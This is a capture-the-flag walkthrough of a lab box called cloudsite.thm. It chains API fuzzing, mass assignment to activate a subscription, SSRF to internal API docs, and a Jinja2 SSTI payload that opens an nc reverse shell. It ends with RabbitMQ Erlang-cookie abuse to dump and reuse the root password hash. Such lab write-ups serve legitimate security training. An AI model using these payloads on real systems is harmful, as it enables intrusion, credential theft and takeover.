# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :---- | :------ |
| 22 | ssh |
| 80 | http |
| 4369 | epmd |
| 25672 | unknown |

We got 4 open ports, here's the Nmap scan:

![Pasted image 20250226145915.png](../../IMAGES/Pasted%20image%2020250226145915.png)

So, before we start, let's add `cloudsite.thm` to `/etc/hosts`:

```
echo 'IP cloudsite.thm' | sudo tee -a /etc/hosts
```

Now, let's begin.


# RECONNAISSANCE
---

![Pasted image 20250226150256.png](../../IMAGES/Pasted%20image%2020250226150256.png)


We got a login section, let's take a look:

![Pasted image 20250226150811.png](../../IMAGES/Pasted%20image%2020250226150811.png)

Now, we need to add `storage.cloudsite.thm` to `/etc/hosts`, in this part, it would be useful to fuzz for any other subdomains to check if we missed some:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cloudsite.thm/ -H "Host:FUZZ.cloudsite.thm" -fc 302 -ic -c -t 200

storage [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 162ms
```

We didn't miss anything, let's add it and continue:

![Pasted image 20250226151210.png](../../IMAGES/Pasted%20image%2020250226151210.png)


Let's create a test account first:

```
test@test.com:test
```


![Pasted image 20250226151727.png](../../IMAGES/Pasted%20image%2020250226151727.png)

Let's check the request in burp:

![Pasted image 20250226152008.png](../../IMAGES/Pasted%20image%2020250226152008.png)


![Pasted image 20250226152021.png](../../IMAGES/Pasted%20image%2020250226152021.png)


Basically, the sequence goes like this:

1. We create a test account and log in.
2. Next request tells us our account's got an inactive subscription.
3. We cannot enumerate any further.

But, we gained some knowledge about the behavior of the app, it makes a call to an API for the login section, let's try to enumerate this API:

```bash
ffuf -u 'http://storage.cloudsite.thm/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -mc all -t 100 -ic -c -fc 404 -t 200

docs [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 267ms]
login [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 278ms]
uploads [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 322ms]
register [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 335ms]
```

We found three more endpoints:

```
docs
register
uploads
```

Let's begin the exploitation part.

# EXPLOITATION
---

Now, knowing these endpoints we can work with the API a bit better, the `register` endpoint works for registering an account, now, let's check the other two:

```bash
curl -s -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0MDYwMTA0MCwiZXhwIjoxNzQwNjA0NjQwfQ.gzrmvd6bhydOUlFKXrcQyVMuds2dSmt-sWvjUdDih_w' 'http://storage.cloudsite.thm/api/uploads' | jq

{
 "message": "Your subscription is inactive. You cannot use our services."
}
```

So, with our current token, we can not access the `uploads` endpoint, let's check the `docs` one:


```bash
curl -s -H 'Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0MDYwMTA0MCwiZXhwIjoxNzQwNjA0NjQwfQ.gzrmvd6bhydOUlFKXrcQyVMuds2dSmt-sWvjUdDih_w' 'http://storage.cloudsite.thm/api/docs' | jq

{
 "message": "Access denied"
}
```

In this one we get access denied, seems like either way we are unable to read the endpoints without an active subscription, this means, we need to find a way to get it, let's check the login request once again:

![Pasted image 20250226152958.png](../../IMAGES/Pasted%20image%2020250226152958.png)

If we check the way the cookie is being generated, we check that we got another data in the json, it goes:

```json
"subscription":"inactive"
```

I think that if we're able to change that in the register endpoint, we can active our subscription, let's create another account:

![Pasted image 20250226153148.png](../../IMAGES/Pasted%20image%2020250226153148.png)

Now, let's add this in the data:

```json
"subscription":"active"
```


![Pasted image 20250226153239.png](../../IMAGES/Pasted%20image%2020250226153239.png)

And it worked:

![Pasted image 20250226153250.png](../../IMAGES/Pasted%20image%2020250226153250.png)

Now, let's try to log in:

```
test2@test.com:test2
```

![Pasted image 20250226153346.png](../../IMAGES/Pasted%20image%2020250226153346.png)

And now, it's changed to active, let's check the panel now:


![Pasted image 20250226153426.png](../../IMAGES/Pasted%20image%2020250226153426.png)

![Pasted image 20250226153434.png](../../IMAGES/Pasted%20image%2020250226153434.png)


Let's try sending a simple file using the `Upload From Url` functionality, for this, we need to start a python server and create a test file:

```bash
echo 'test' > test.txt

python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.36.123 - - [26/Feb/2025 20:44:20] "GET /test.txt HTTP/1.1" 200 -
```

Now, this happens:

![Pasted image 20250226154538.png](../../IMAGES/Pasted%20image%2020250226154538.png)

![Pasted image 20250226154547.png](../../IMAGES/Pasted%20image%2020250226154547.png)

And we got a link to our file, let's open burp and analyze the request:

![Pasted image 20250226154631.png](../../IMAGES/Pasted%20image%2020250226154631.png)

We are making use of the `uploads` endpoint found previously on the API, it makes a GET request and retrieves the content of the file, but what about the request when downloading a file from an URL:

![Pasted image 20250226154759.png](../../IMAGES/Pasted%20image%2020250226154759.png)

Now, another call to another endpoint happens, we are now calling the `store_url` endpoint, if we make a successful call and are able to download a file, this is the output:

![Pasted image 20250226154901.png](../../IMAGES/Pasted%20image%2020250226154901.png)

So, what if we try pointing some internal resource, like trying to read `/docs` endpoint of the API, if we use Wappalyzer we can check this:

![Pasted image 20250226155051.png](../../IMAGES/Pasted%20image%2020250226155051.png)

The API seems to be using `Express`, the default port for this is `3000`, so, in order to read `/docs` this would be the data we need to submit:

```json
"url":"http://127.0.0.1:3000/api/docs"
```

This happens:

![Pasted image 20250226155815.png](../../IMAGES/Pasted%20image%2020250226155815.png)

We were able to do it, let's read the file:

![Pasted image 20250226155859.png](../../IMAGES/Pasted%20image%2020250226155859.png)

Found another endpoint, this one seems weird:

```
/api/fetch_messeges_from_chatbot
```

Let's try to check the behavior of the endpoint:

![Pasted image 20250226160121.png](../../IMAGES/Pasted%20image%2020250226160121.png)

As known, it requires a POST request, let's send one with empty data:

![Pasted image 20250226160238.png](../../IMAGES/Pasted%20image%2020250226160238.png)

If we change our username to `admin` this happens:

![Pasted image 20250226160324.png](../../IMAGES/Pasted%20image%2020250226160324.png)

We get an error message saying: `Sorry, admin, our chatbot server is currently under development.`

But, if we analyze the error message, we see that our input gets reflected in the response the endpoint is giving us, let's change the username to test and check if its true:

![Pasted image 20250226160441.png](../../IMAGES/Pasted%20image%2020250226160441.png)

And that's correct, let's test for `SSTI`:

![Pasted image 20250226160538.png](../../IMAGES/Pasted%20image%2020250226160538.png)

We got it, this is vulnerable to SSTI, in this case, we are facing Jinja2, let's take a look at my old notes from HTB BBHP which talks about this: 

[Exploiting Jinja2](../../Bug%20Bounty/HTB%20BUG%20BOUNTY%20HUNTER%20PATH/Server-Side%20Attacks/SSTI/Exploiting%20SSTI%20-%20Jinja2.md)

For example, let's try to read the web application configuration:

![Pasted image 20250226161449.png](../../IMAGES/Pasted%20image%2020250226161449.png)

Nice, now, our next step is getting a shell:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f').read() }}
```

After we send this:

![Pasted image 20250226161615.png](../../IMAGES/Pasted%20image%2020250226161615.png)

We got a shell as `azrael`, let's begin privilege escalation.

# PRIVILEGE ESCALATION
---

First step would be getting an [stable shell](../../Commands/Shell%20Tricks/STABLE%20SHELL.md):

![Pasted image 20250226161731.png](../../IMAGES/Pasted%20image%2020250226161731.png)

There is our first flag:

```shell
azrael@forge:~$ cat user.txt

98d3a30fa86523c580144d317be0c47e
```


If we check `/var/lib`, we can find this:


```
drwxr-xr-x 5 rabbitmq rabbitmq 4096 Sep 12 00:32 rabbitmq
```

We find a `rabbitmq` directory, let's check the contents:

```
azrael@forge:~$ ls -la /var/lib/rabbitmq
total 896
drwxr-xr-x 5 rabbitmq rabbitmq 4096 Sep 12 00:32 .
drwxr-xr-x 45 root root 4096 Sep 20 19:11 ..
drwxr-x--- 3 rabbitmq rabbitmq 4096 Aug 15 2024 config
-r-----r-- 1 rabbitmq rabbitmq 16 Feb 26 20:53 .erlang.cookie
-rw-r----- 1 rabbitmq rabbitmq 889386 Feb 26 20:53 erl_crash.dump
drwxr-x--- 4 rabbitmq rabbitmq 4096 Feb 26 20:53 mnesia
-rw-r----- 1 rabbitmq rabbitmq 0 Sep 12 00:33 nc
drwxr-x--- 2 rabbitmq rabbitmq 4096 Jul 18 2024 schema
```

We found a `.erlang.cookie` file, let's read it:

```
azrael@forge:~$ cat /var/lib/rabbitmq/.erlang.cookie
R2z1G0FXf6Rk2H2w
```

Now, from our Nmap scan at the beginning, we now that rabbitmq node is running on this server, using the erlang cookie we can interact with the node, let's add `forge` to `/etc/hosts`, and then, we can use `rabbitmqctl`:

```
sudo rabbitmqctl --erlang-cookie 'R2z1G0FXf6Rk2H2w' --node rabbit@forge status

Status of node rabbit@forge ...
[]
Runtime

OS PID: 1193
OS: Linux
Uptime (seconds): 4760
Is under maintenance?: false
RabbitMQ version: 3.9.13
RabbitMQ release series support status: see https://www.rabbitmq.com/release-information
Node name: rabbit@forge
Erlang configuration: Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
Crypto library: 
Erlang processes: 393 used, 1048576 limit
Scheduler run queue: 1
Cluster heartbeat timeout (net_ticktime): 60

Plugins

Enabled plugin file: /etc/rabbitmq/enabled_plugins
Enabled plugins:

 * rabbitmq_management
 * amqp_client
 * rabbitmq_web_dispatch
 * cowboy
 * cowlib
 * rabbitmq_management_agent

Data directory

Node data directory: /var/lib/rabbitmq/mnesia/rabbit@forge
Raft data directory: /var/lib/rabbitmq/mnesia/rabbit@forge/quorum/rabbit@forge

Config files

 * /etc/rabbitmq/rabbitmq.conf

Log file(s)

 * /var/log/rabbitmq/rabbit@forge.log
 * /var/log/rabbitmq/rabbit@forge_upgrade.log
 * <stdout>
```


And it works, let's try to enumerate users:

```
sudo rabbitmqctl --erlang-cookie 'R2z1G0FXf6Rk2H2w' --node rabbit@forge list_users

Listing users ...
user	tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.	[]
root	[administrator]
```

Now, let's check root password:

```
sudo rabbitmqctl --erlang-cookie 'R2z1G0FXf6Rk2H2w' --node rabbit@forge export_definitions /tmp/data.json

cat /tmp/data.json | jq '.users[] | select(.name == "root")'
{
 "hashing_algorithm": "rabbit_password_hashing_sha256",
 "limits": {},
 "name": "root",
 "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
 "tags": [
 "administrator"
 ]
}
```

We got our hash, we can decode it using the following command:

```
echo -n '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 100

e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

Now, based on the way the hash is structured, we need to remove the 4 byte salt: `e3d7ba85`, this leaves us with our real hash:

```
295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

We can now switch users:

![Pasted image 20250226171829.png](../../IMAGES/Pasted%20image%2020250226171829.png)

And there we are, we are now root, let's read our `root.txt` file:

``
```
root@forge:~# cat root.txt

eabf7a0b05d3f2028f3e0465d2fd0852
```
